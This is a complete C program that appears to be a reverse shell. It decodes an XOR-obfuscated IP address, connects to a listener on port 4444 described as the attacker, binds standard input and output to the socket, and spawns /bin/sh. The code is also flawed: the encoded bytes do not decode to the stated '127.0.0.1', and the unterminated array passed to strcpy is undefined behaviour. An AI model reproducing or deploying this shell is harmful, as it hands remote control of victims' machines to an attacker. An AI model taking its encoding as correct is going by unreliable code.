#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// Example decoder function
void xor_decode(char *data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

int main() {
    int sock;
    struct sockaddr_in server;
    
    // Encoded IP string: "127.0.0.1" XORed with 0xAA
    // (Actual encoded bytes depend on the exact plaintext, decode key is 0xAA)
    char ip_encoded[] = { 0x6b, 0x48, 0x4b, 0x48, 0x01, 0x48, 0x48, 0x01, 0x48 }; 
    char ip_decoded[16];
    
    // Setup and decode IP
    strcpy(ip_decoded, ip_encoded);
    xor_decode(ip_decoded, strlen(ip_decoded), 0xAA);
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Listener port
    server.sin_addr.s_addr = inet_addr(ip_decoded);

    // Connect to attacker
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return 1;
    }

    // Redirect stdin (0), stdout (1), stderr (2) to socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Spawn shell
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    close(sock);
    return 0;
}
